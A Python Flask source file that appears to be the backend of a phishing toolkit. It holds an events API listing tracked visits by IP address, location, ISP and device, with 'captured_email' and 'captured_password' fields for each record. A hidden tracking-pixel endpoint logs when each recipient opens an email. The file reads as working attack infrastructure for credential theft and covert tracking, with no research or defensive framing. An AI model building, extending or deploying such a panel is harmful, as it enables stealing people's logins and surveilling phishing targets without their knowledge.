from flask import Blueprint, request, jsonify, session
from src.models.user import User
from src.models.link import Link
from src.models.tracking_event import TrackingEvent
from src.models.user import db

events_bp = Blueprint('events', __name__)

@events_bp.route('/api/events', methods=['GET'])
def get_events():
    if 'user_id' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    
    try:
        # Get all tracking events for the user's links using SQLAlchemy
        events = db.session.query(TrackingEvent, Link.short_code).join(
            Link, TrackingEvent.link_id == Link.id
        ).filter(
            Link.user_id == session['user_id']
        ).order_by(
            TrackingEvent.timestamp.desc()
        ).limit(1000).all()
        
        events_list = []
        for event, short_code in events:
            events_list.append({
                'id': event.id,
                'timestamp': event.timestamp.isoformat() if event.timestamp else None,
                'tracking_id': short_code,
                'ip_address': event.ip_address,
                'user_agent': event.user_agent,
                'country': event.country or 'Unknown',
                'city': event.city or 'Unknown',
                'isp': event.isp or 'Unknown',
                'captured_email': event.captured_email,
                'captured_password': event.captured_password,
                'status': event.status or 'processed',
                'blocked_reason': event.blocked_reason,
                'email_opened': bool(event.email_opened),
                'redirected': bool(event.redirected),
                'on_page': bool(event.on_page),
                'unique_id': event.unique_id,
                'device_type': event.device_type,
                'browser': event.browser,
                'operating_system': event.operating_system
            })
        
        return jsonify({
            'success': True,
            'events': events_list
        })
        
    except Exception as e:
        print(f"Error fetching events: {e}")
        return jsonify({'error': 'Failed to fetch events'}), 500

@events_bp.route('/api/pixel/<link_id>', methods=['GET'])
def pixel_tracking(link_id):
    """Handle pixel tracking requests"""
    try:
        # Get link details
        link = Link.query.filter_by(short_code=link_id).first()
        if not link:
            # Return 1x1 transparent pixel even if link not found
            return _get_transparent_pixel()
        
        # Get request details
        ip_address = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
        user_agent = request.headers.get("User-Agent", "")
        uid = request.args.get("uid", "")  # Unique identifier parameter
        
        # Simulate geolocation and ISP lookup (replace with actual API calls in production)
        country = "Unknown"
        city = "Unknown"
        isp = "Unknown"
        
        # Determine status based on endpoint (for now, assume pixel hit means email opened)
        email_opened = True
        redirected = False  # This will be set to True when the user is redirected to the target URL
        on_page = False     # This would require a separate signal from the landing page
        
        # Create tracking event
        event = TrackingEvent(
            link_id=link.id,
            ip_address=ip_address,
            user_agent=user_agent,
            country=country,
            city=city,
            isp=isp,
            status="processed",
            unique_id=uid,
            email_opened=email_opened,
            redirected=redirected,
            on_page=on_page
        )
        
        db.session.add(event)
        db.session.commit()
        
        return _get_transparent_pixel()
        
    except Exception as e:
        print(f"Error in pixel tracking: {e}")
        db.session.rollback()
        return _get_transparent_pixel()

def _get_transparent_pixel():
    """Return a 1x1 transparent PNG pixel"""
    from flask import Response
    import base64
    
    # 1x1 transparent PNG
    pixel_data = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==")
    
    response = Response(pixel_data, mimetype="image/png")
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    
    return response

# Add pixel route with different path patterns
@events_bp.route('/p/<link_id>', methods=['GET'])
def pixel_tracking_short(link_id):
    """Alternative pixel tracking endpoint"""
    return pixel_tracking(link_id)

@events_bp.route('/pixel/<link_id>.png', methods=['GET'])
def pixel_tracking_png(link_id):
    """Pixel tracking with .png extension"""
    return pixel_tracking(link_id)

